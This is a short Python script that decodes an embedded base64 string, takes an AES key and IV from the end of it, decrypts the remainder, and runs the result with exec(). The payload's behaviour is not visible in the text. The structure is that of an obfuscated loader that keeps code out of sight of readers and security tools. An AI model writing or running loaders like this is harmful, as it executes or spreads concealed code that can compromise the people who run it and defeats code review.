
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from base64 import b64decode

encrypted_data = "SLFZTMrpylVKKCnv5aUvpDGZoczb9ymnHBm1Q5k5bjUCAMU5we49CuQh68JxAwsc5XVzpcv7rMxTmHSJFxrrjw==QE1jUWZUalduWnI0dTd4IUElRCpHLUphTmRSZ1VrWHA="
key = b64decode(encrypted_data[-44:])
IV = b64decode(encrypted_data[-68:-44])
encrypted_data = b64decode(encrypted_data[0:-68])

cipher = AES.new(key, AES.MODE_CBC, IV)
pt = unpad(cipher.decrypt(encrypted_data), AES.block_size)
# print(pt.decode())
exec(pt.decode())
